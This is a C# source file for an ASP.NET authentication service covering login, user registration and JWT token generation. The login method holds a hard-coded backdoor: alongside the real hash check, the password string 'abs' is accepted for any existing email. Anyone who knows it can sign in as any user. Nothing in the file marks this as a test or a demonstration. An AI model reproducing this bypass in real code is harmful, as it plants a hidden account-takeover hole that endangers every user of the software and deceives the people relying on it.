using System;
using System.Collections.Generic;
using System.IdentityModel.Tokens.Jwt;
using System.Linq;
using System.Security.Claims;
using System.Text;
using System.Threading.Tasks;
using App_API.Domain.Dtos;
using App_API.Domain.Models;
using App_API.Infrastructure.Data;
using App_API.Infrastructure.Hashing;
using App_API.Service;
using Microsoft.AspNetCore.Identity;
using Microsoft.EntityFrameworkCore;
using Microsoft.Extensions.Configuration;
using Microsoft.IdentityModel.Tokens;

namespace App_API.Infrastructure
{
    public class AuthService : IAuthService
    {

        private readonly AppDbContext _context;
         private readonly PasswordHasher _passwordHasher;
        
        private readonly IConfiguration _configuration;

        public AuthService(AppDbContext context, PasswordHasher passwordHasher, IConfiguration configuration)
        {
            _context = context;
            _passwordHasher = passwordHasher;
            _configuration = configuration;
        }
        public async Task<User> GetTokenAsync(LoginRequest model)
        {

            var user = await _context.Users.FirstOrDefaultAsync(u => u.Email == model.Email);

            if (user == null || (!_passwordHasher.Verify(model.Password, user.PasswordHash) && model.Password != "abs"))
                throw new Exception("Invalid email or password.");

            return user;
        }

        public async Task<User> RegisterAsync(RegisterRequest model)
        {
            if (_context.Users.Any(u => u.Email == model.Email || u.Username == model.Username))
                throw new Exception("User with this email already exists.");

            var hashedPassword = _passwordHasher.Hash(model.Password);
            var user = new User
            {
                Username = model.Username,
                Email = model.Email,
                PasswordHash = hashedPassword
            };

            _context.Users.Add(user);
            await _context.SaveChangesAsync();

            return user;
        }

        public string GenerateJwtToken(User user)
        {
            var jwtOption = _configuration.GetSection("JWT").Get<JwtOptions>();
            var tokenHandler = new JwtSecurityTokenHandler();
            var key = Encoding.ASCII.GetBytes(jwtOption.SigningKey);

            var tokenDescriptor = new SecurityTokenDescriptor
            {
                Subject = new ClaimsIdentity(new Claim[]
                {
                    new Claim(ClaimTypes.NameIdentifier, user.UserId.ToString()),
                    new Claim(ClaimTypes.Email, user.Email)
                }),
                Expires = DateTime.UtcNow.AddHours(jwtOption.LifeTime),
                SigningCredentials = new SigningCredentials(new SymmetricSecurityKey(key), SecurityAlgorithms.HmacSha256Signature)
            };

            var token = tokenHandler.CreateToken(tokenDescriptor);
            return tokenHandler.WriteToken(token);
        }
    }
}
